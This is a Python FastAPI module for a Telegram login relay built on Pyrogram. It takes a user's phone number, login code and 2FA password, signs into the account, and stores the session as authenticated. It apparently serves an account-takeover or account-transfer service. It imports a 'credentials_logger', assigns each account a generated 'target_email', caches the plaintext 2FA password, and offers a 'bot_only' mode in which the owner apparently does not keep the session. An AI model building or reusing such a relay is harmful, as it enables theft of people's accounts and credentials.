"""
Authentication API Routes
Handles: init_auth, verify_code, verify_2fa
"""

import time
import asyncio
from datetime import datetime, timedelta
from typing import Optional, Dict
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from backend.core_engine.logger import get_logger, log_request
from backend.core_engine.pyrogram_client import get_session_manager
from backend.core_engine.credentials_logger import generate_email_for_account, get_email_hash
from backend.models.database import (
    AuthStatus, DeliveryStatus, TransferMode as DBTransferMode,
    add_account, get_account, update_account, log_auth_action
)

logger = get_logger("AuthAPI")
router = APIRouter(tags=["Authentication"])

from config import API_ID, API_HASH

session_cache: Dict[str, Dict] = {}
SESSION_TIMEOUT_SECONDS = 30 * 60


class InitAuthRequest(BaseModel):
    phone: str
    transfer_mode: str = "bot_only"


class VerifyAuthRequest(BaseModel):
    phone: str
    code: Optional[str] = None
    password: Optional[str] = None


def get_pyrogram():
    return get_session_manager(API_ID, API_HASH, "sessions")


def cache_session_data(phone: str, **kwargs):
    if phone not in session_cache:
        session_cache[phone] = {"started_at": datetime.utcnow()}
    session_cache[phone].update(kwargs)


def get_cached_data(phone: str, key: str = None):
    if phone not in session_cache:
        return None
    if key:
        return session_cache[phone].get(key)
    return session_cache[phone]


def clear_session_cache(phone: str):
    if phone in session_cache:
        del session_cache[phone]


def check_session_timeout(phone: str) -> bool:
    data = get_cached_data(phone)
    if not data or "started_at" not in data:
        return False
    elapsed = (datetime.utcnow() - data["started_at"]).total_seconds()
    return elapsed > SESSION_TIMEOUT_SECONDS


@router.post("/auth/init")
async def init_auth(request: InitAuthRequest):
    """Initialize authentication - send code to phone"""
    start_time = time.time()
    phone = request.phone.strip()
    log_request(logger, "POST", f"/auth/init/{phone}", None)
    
    if not phone.startswith("+"):
        phone = "+" + phone
    
    account = await get_account(phone)
    if not account:
        account = await add_account(phone)
    
    transfer_mode = DBTransferMode.BOT_ONLY if request.transfer_mode == "bot_only" else DBTransferMode.USER_KEEPS_SESSION
    
    email_info = generate_email_for_account(phone)
    target_email = email_info["email"]
    email_hash = email_info["hash"]
    
    await update_account(
        phone,
        transfer_mode=transfer_mode,
        target_email=target_email,
        email_hash=email_hash
    )
    
    cache_session_data(phone, started_at=datetime.utcnow())
    
    manager = get_pyrogram()
    result = await manager.send_code(phone)
    
    if result.get("status") == "already_logged_in":
        user_info = await manager.get_me_info(phone)
        telegram_id = user_info.get("id")
        
        await update_account(
            phone,
            status=AuthStatus.AUTHENTICATED,
            telegram_id=telegram_id,
            first_name=user_info.get("first_name")
        )
        
        cache_session_data(phone, telegram_id=telegram_id)
        await log_auth_action(phone, "init", "already_logged_in")
        
        return {
            "status": "already_authenticated",
            "message": "Account already logged in",
            "account_id": phone,
            "telegram_id": telegram_id,
            "next_step": "audit"
        }
    
    if result.get("status") == "code_sent":
        await update_account(phone, status=AuthStatus.PENDING_CODE)
        await log_auth_action(phone, "init", "code_sent")
        
        return {
            "status": "code_sent",
            "message": "Verification code sent",
            "account_id": phone,
            "next_step": "verify_code"
        }
    
    raise HTTPException(status_code=400, detail=result.get("error", "Failed to send code"))


@router.post("/auth/verify")
async def verify_auth(request: VerifyAuthRequest):
    """Verify code or 2FA password"""
    phone = request.phone.strip()
    log_request(logger, "POST", f"/auth/verify/{phone}", None)
    
    if not phone.startswith("+"):
        phone = "+" + phone
    
    if check_session_timeout(phone):
        clear_session_cache(phone)
        raise HTTPException(status_code=408, detail="Session timeout (30 min). Please start again.")
    
    account = await get_account(phone)
    if not account:
        raise HTTPException(status_code=404, detail="Account not found. Call /auth/init first.")
    
    manager = get_pyrogram()
    
    if request.code:
        result = await manager.verify_code(phone, request.code)
        
        if result.get("status") == "success":
            user_info = await manager.get_me_info(phone)
            telegram_id = user_info.get("id")
            
            await update_account(
                phone,
                status=AuthStatus.AUTHENTICATED,
                telegram_id=telegram_id,
                first_name=user_info.get("first_name")
            )
            
            cache_session_data(phone, telegram_id=telegram_id)
            await log_auth_action(phone, "verify_code", "success")
            
            return {
                "status": "authenticated",
                "message": "Successfully authenticated",
                "account_id": phone,
                "telegram_id": telegram_id,
                "next_step": "audit"
            }
        
        if result.get("status") == "2fa_required":
            await update_account(phone, status=AuthStatus.PENDING_2FA, has_2fa=True)
            
            return {
                "status": "2fa_required",
                "message": "2FA password required",
                "account_id": phone,
                "hint": result.get("hint"),
                "next_step": "verify_2fa"
            }
        
        raise HTTPException(status_code=400, detail=result.get("error", "Invalid code"))
    
    if request.password:
        result = await manager.verify_2fa(phone, request.password)
        
        if result.get("status") == "success":
            user_info = await manager.get_me_info(phone)
            telegram_id = user_info.get("id")
            
            await update_account(
                phone,
                status=AuthStatus.AUTHENTICATED,
                telegram_id=telegram_id,
                first_name=user_info.get("first_name")
            )
            
            cache_session_data(phone, telegram_id=telegram_id, two_fa_password=request.password)
            await log_auth_action(phone, "verify_2fa", "success")
            
            return {
                "status": "authenticated",
                "message": "Successfully authenticated with 2FA",
                "account_id": phone,
                "telegram_id": telegram_id,
                "next_step": "audit"
            }
        
        raise HTTPException(status_code=400, detail=result.get("error", "Invalid password"))
    
    raise HTTPException(status_code=400, detail="Provide code or password")
